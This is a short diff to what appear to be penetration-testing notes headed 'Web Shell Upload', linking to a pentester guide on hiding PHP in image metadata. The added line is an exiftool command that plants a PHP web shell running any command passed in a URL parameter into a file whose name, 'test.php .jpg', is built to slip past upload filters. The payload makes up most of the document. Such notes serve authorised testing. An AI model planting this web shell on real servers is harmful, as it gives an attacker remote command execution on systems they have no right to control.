@@ -1,3 +1,5 @@
+exiftool "test.php .jpg" -comment="<?php system(\$_GET['cmd']); ?>"
+
 https://docs.andalik.com.br/guia-para-pentesters/procedimento-operacional-padrao-pop/pentest/shell-upload#metodo-4-injetar-codigo-php-nos-metadados-da-imagem
 
 Web Shell Upload
